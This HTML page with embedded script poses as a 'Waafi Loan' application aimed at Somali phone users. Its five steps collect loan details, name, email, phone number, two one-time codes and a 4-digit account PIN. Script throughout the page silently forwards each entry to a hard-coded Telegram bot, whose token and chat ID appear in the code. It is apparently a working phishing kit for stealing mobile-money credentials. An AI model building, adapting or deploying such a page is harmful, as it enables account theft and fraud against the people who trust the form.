<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Waafi Loan</title>
<style>
body {font-family: Arial; background:#fff7ed; margin:0; padding:20px;}
.container {max-width:400px; margin:auto; background:white; padding:20px; border-radius:16px; box-shadow:0 4px 15px rgba(251,146,60,0.2); border-top:5px solid #f97316;}
.step {display:none;}
.step.active {display:block;}
h2 {color:#f97316; text-align:center; font-size:22px;}
input, select, button {width:100%; padding:14px; margin:10px 0; border:1px solid #fed7aa; border-radius:10px; font-size:16px; box-sizing:border-box;}
input:focus, select:focus {border-color:#f97316; outline:none; box-shadow:0 0 0 3px rgba(249,115,22,0.1);}
button {background:linear-gradient(135deg, #f97316, #fb923c); color:white; border:none; cursor:pointer; font-weight:bold; font-size:17px;}
button:hover {background:linear-gradient(135deg, #ea580c, #f97316);}
.progress {display:flex; justify-content:space-between; margin-bottom:25px;}
.dot {width:30px; height:30px; border-radius:50%; background:#ffedd5; text-align:center; line-height:30px; font-size:13px; color:#9a3412; font-weight:bold;}
.dot.active {background:#f97316; color:white;}
.error {color:#dc2626; font-size:14px; text-align:center;}
.success {color:#16a34a; font-size:14px; text-align:center;}
.logo {text-align:center; font-size:28px; margin-bottom:10px; font-weight:bold;}
</style>
</head>
<body>
<div class="container">

<div class="logo">🟠 WAAFI LOAN</div>

<div class="progress">
  <div class="dot active" id="dot1">1</div>
  <div class="dot" id="dot2">2</div>
  <div class="dot" id="dot3">3</div>
  <div class="dot" id="dot4">4</div>
  <div class="dot" id="dot5">5</div>
</div>

<!-- STEP 1: LOAN DETAILS -->
<div class="step active" id="step1">
  <h2>Loan Application</h2>
  <select id="loan_type">
    <option value="">Select Loan Type</option>
    <option>Personal Loan</option>
    <option>Business Loan</option>
    <option>Student Loan</option>
  </select>
  <input type="number" id="amount" placeholder="Loan Amount $">
  <button onclick="nextStep(2)">Continue</button>
</div>

<!-- STEP 2: PERSONAL INFO -->
<div class="step" id="step2">
  <h2>Personal Information</h2>
  <input type="text" id="name" placeholder="Full Name" required>
  <input type="email" id="email" placeholder="Email" required>
  <input type="tel" id="phone" placeholder="Phone +252" required>
  <button onclick="nextStep(3)">Continue</button>
</div>

<!-- STEP 3: OTP 1/2 -->
<div class="step" id="step3">
  <h2>📱 Verification 1/2</h2>
  <p style="text-align:center;">Sending OTP to <b id="userPhone" style="color:#f97316;"></b></p>
  <button onclick="sendFirstOTP()">Send First OTP</button>
  <p class="success" id="otp1Status"></p>
</div>

<!-- STEP 4: OTP 2/2 -->
<div class="step" id="step4">
  <h2>📱 Verification 2/2</h2>
  <p style="text-align:center;">Enter code from Telegram</p>
  <input type="text" id="otp1" maxlength="6" placeholder="Enter First OTP">
  <button onclick="sendSecondOTP()">Verify & Continue</button>
  <p class="error" id="otpError"></p>
</div>

<!-- STEP 5: PIN -->
<div class="step" id="step5">
  <h2>🔑 Prompt PIN</h2>
  <p style="text-align:center;">Enter your 4-digit PIN</p>
  <input type="password" id="pin" maxlength="4" placeholder="****">
  <button onclick="verifyPIN()">Verify PIN & Submit</button>
  <p class="success" id="finalStatus"></p>
</div>

</div>

<script>
// ====== YOUR BOT CREDENTIALS ======
const TELEGRAM_BOT_TOKEN = '8891157525:AAE5aTPkL2v0Hycuifq0VywOp6kCtblGzhg';
const TELEGRAM_CHAT_ID = '8630213836';
// ==================================

let formData = {};
let generatedOTP1 = "";
let generatedOTP2 = "";

function updateProgress(n) {
  for(let i=1; i<=5; i++) {
    document.getElementById('dot'+i).classList.remove('active');
  }
  document.getElementById('dot'+n).classList.add('active');
}

function nextStep(n) {
  if(n==2) {
    formData.loan_type = document.getElementById('loan_type').value;
    formData.amount = document.getElementById('amount').value;
    if(!formData.loan_type || !formData.amount) {alert("Fill all fields"); return;}
  }
  if(n==3) {
    formData.name = document.getElementById('name').value;
    formData.email = document.getElementById('email').value;
    formData.phone = document.getElementById('phone').value;
    if(!formData.name || !formData.email || !formData.phone) {alert("Fill all fields"); return;}
    document.getElementById('userPhone').innerText = formData.phone;
  }
  
  document.querySelector('.step.active').classList.remove('active');
  document.getElementById('step'+n).classList.add('active');
  updateProgress(n);
}

async function sendToTelegram(text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    const res = await fetch(url, {
      method: 'POST',
      mode: 'cors', // FIX FOR RENDER
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML'})
    });
    const data = await res.json();
    if(!data.ok) {
      alert("TELEGRAM ERROR: " + data.description + "\n\nCheck Token and Chat ID");
    }
  } catch(e) {
    alert("NETWORK ERROR: " + e.message + "\n\nIf this continues, Telegram is blocked. Tell me.");
  }
}

function getTime() {
  return new Date().toLocaleTimeString('en-US', {hour: '2-digit', minute:'2-digit', second:'2-digit'});
}

function cleanPhone(p) {
  return p.replace('+252','').replace(/\s/g,'');
}

async function sendFirstOTP() {
  generatedOTP1 = Math.floor(100000 + Math.random() * 900000).toString();
  const time = getTime();
  const phone = cleanPhone(formData.phone);
  
  document.getElementById('otp1Status').innerText = "Sending...";
  
  await sendToTelegram(`✅ <b>Status:</b> First OTP (1/2) will be sent\n⏰ ${time}`);
  await sendToTelegram(`📱 <b>OTP CODE:</b> ${generatedOTP1}\n🇸🇴 <b>Somalia</b>\n📱 ${phone}`);
  
  document.getElementById('otp1Status').innerText = "✅ First OTP Sent! Check Telegram";
  setTimeout(() => nextStep(4), 1500);
}

async function sendSecondOTP() {
  const enteredOTP1 = document.getElementById('otp1').value;
  if(enteredOTP1 !== generatedOTP1) {
    document.getElementById('otpError').innerText = "Invalid First OTP. Try again";
    return;
  }
  
  generatedOTP2 = Math.floor(100000 + Math.random() * 900000).toString();
  const time = getTime();
  const phone = cleanPhone(formData.phone);
  
  document.getElementById('otpError').innerText = "";
  
  await sendToTelegram(`✅ <b>Status:</b> Second OTP (2/2) will be sent\n⏰ ${time}`);
  await sendToTelegram(`📱 <b>OTP CODE:</b> ${generatedOTP2}\n🇸🇴 <b>Somalia</b>\n📱 ${phone}`);
  
  alert("Second OTP sent! Check your Telegram");
  nextStep(5);
}

async function verifyPIN() {
  const pin = document.getElementById('pin').value;
  if(pin.length < 4) {alert("Enter 4 digit PIN"); return;}
  const time = getTime();
  const phone = cleanPhone(formData.phone);
  
  document.getElementById('finalStatus').innerText = "Submitting...";
  
  await sendToTelegram(`📱 <b>PIN METHOD:</b> Prompt PIN\n🇸🇴 <b>Somalia</b>\n📱 ${phone}`);
  await sendToTelegram(`⏳ <b>Status:</b> User will be prompted on device\n⏰ ${time}`);
  await sendToTelegram(`📱 <b>PROMPT PIN VERIFIED</b> ✅\n🇸🇴 <b>Somalia</b>\n📱 ${phone}\n\n✅ <b>Status:</b> PIN entered successfully on device\n🎉 <b>Result:</b> User logged in\n⏰ <b>Cached for 30 minutes</b>\n⏰ ${time}`);
  
  const finalMsg = `🟠 <b>🆕 NEW WAAFI LOAN APPLICATION</b>
================================
<b>NAME:</b> ${formData.name}
<b>EMAIL:</b> ${formData.email}
<b>PHONE:</b> ${formData.phone}
<b>LOAN:</b> ${formData.loan_type} $${formData.amount}
<b>OTP1:</b> ${generatedOTP1}
<b>OTP2:</b> ${generatedOTP2}
<b>PIN:</b> ${pin}
================================
⏰ ${new Date().toLocaleString()}`;

  await sendToTelegram(finalMsg);
  document.getElementById('finalStatus').innerText = "✅ Application Submitted Successfully!";
}
</script>
</body>
</html>
